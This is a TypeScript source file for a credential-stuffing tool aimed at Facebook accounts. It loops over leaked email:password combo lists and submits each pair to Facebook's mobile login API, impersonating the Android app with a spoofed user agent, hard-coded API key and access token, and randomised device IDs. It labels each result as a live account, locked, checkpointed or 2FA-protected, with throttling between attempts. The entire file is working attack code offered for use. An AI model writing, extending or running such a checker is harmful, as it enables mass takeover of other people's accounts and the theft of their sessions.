import type { TaskResult } from "@workspace/db";

export interface CrckOptions {
  combos: string[];
  delay: number;
  onResult: (result: TaskResult) => Promise<void>;
  signal: AbortSignal;
}

const FB_MOBILE_UA =
  "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.0.45;]";

export async function runCrck(opts: CrckOptions): Promise<void> {
  const { combos, delay, onResult, signal } = opts;

  for (const line of combos) {
    if (signal.aborted) break;
    if (!line.trim()) continue;

    const [email, password] = splitCombo(line);
    if (!email || !password) {
      await onResult({
        line,
        status: "fail",
        detail: "Invalid format — use email:password",
        timestamp: new Date().toISOString(),
      });
      continue;
    }

    try {
      const result = await checkAccount(email, password);
      await onResult({
        line,
        status: result.status,
        detail: result.detail,
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      await onResult({
        line,
        status: "fail",
        detail: err instanceof Error ? err.message : "Network error",
        timestamp: new Date().toISOString(),
      });
    }

    if (!signal.aborted) await sleep(delay);
  }
}

async function checkAccount(
  email: string,
  password: string
): Promise<{ status: "ok" | "fail" | "no_cp" | "no_limit"; detail: string }> {
  const params = new URLSearchParams({
    adid: generateAdid(),
    email,
    password,
    format: "json",
    device_id: generateDeviceId(),
    credentials_type: "password",
    generate_session_cookies: "1",
    error_detail_type: "button_with_disabled",
    source: "login",
    machine_id: generateMachineId(),
    generate_analytics_claim: "1",
    generate_machine_id: "1",
    currently_logged_in_userid: "0",
    irisSeqID: "1",
    try_num: "1",
    enroll_misauth: "false",
    meta_inf_fbmeta: "NO_FILE",
    locale: "en_US",
    client_country_code: "US",
    fb_api_req_friendly_name: "authenticate",
    fb_api_caller_class: "com.facebook.account.login.protocol.Fb4aAuthHandler",
    api_key: "882a8490361da98702bf97a021ddc14d",
    access_token: "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
  });

  const res = await fetch("https://b-api.facebook.com/method/auth.login", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": FB_MOBILE_UA,
      "x-fb-http-engine": "Liger",
      "x-fb-client-ip": "True",
      "x-fb-server-cluster": "True",
    },
    body: params.toString(),
    signal: AbortSignal.timeout(15000),
  });

  const text = await res.text();
  let json: Record<string, unknown> = {};
  try {
    json = JSON.parse(text) as Record<string, unknown>;
  } catch {
    return { status: "fail", detail: "Invalid response" };
  }

  if (json["access_token"] || json["session_cookies"]) {
    const uid = (json["uid"] as string) ?? "";
    return { status: "ok", detail: `✅ LIVE | UID: ${uid}` };
  }

  const errBody = json["error"] as Record<string, unknown> | undefined;
  const errCode = errBody?.["code"] as number | undefined;
  const errMsg = (errBody?.["message"] as string) ?? text.substring(0, 80);

  if (errCode === 401 || errMsg.toLowerCase().includes("wrong")) {
    return { status: "fail", detail: "❌ Wrong password" };
  }
  if (errCode === 1348131 || errMsg.toLowerCase().includes("checkpoint")) {
    return { status: "no_cp", detail: "⚠️ Checkpoint required" };
  }
  if (errCode === 368 || errMsg.toLowerCase().includes("locked")) {
    return { status: "no_cp", detail: "🔒 Account locked" };
  }
  if (errMsg.toLowerCase().includes("2fa") || errMsg.toLowerCase().includes("two-factor")) {
    return { status: "no_limit", detail: "🔐 2FA enabled" };
  }

  return { status: "fail", detail: errMsg.substring(0, 60) };
}

function splitCombo(line: string): [string, string] {
  const idx = line.indexOf(":");
  if (idx === -1) return ["", ""];
  return [line.substring(0, idx), line.substring(idx + 1)];
}

function generateAdid(): string {
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
    const r = Math.floor(Math.random() * 16);
    return (c === "x" ? r : (r & 0x3) | 0x8).toString(16);
  });
}

function generateDeviceId(): string {
  return generateAdid();
}

function generateMachineId(): string {
  return Array.from({ length: 24 }, () =>
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(
      Math.floor(Math.random() * 62)
    )
  ).join("");
}

function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}
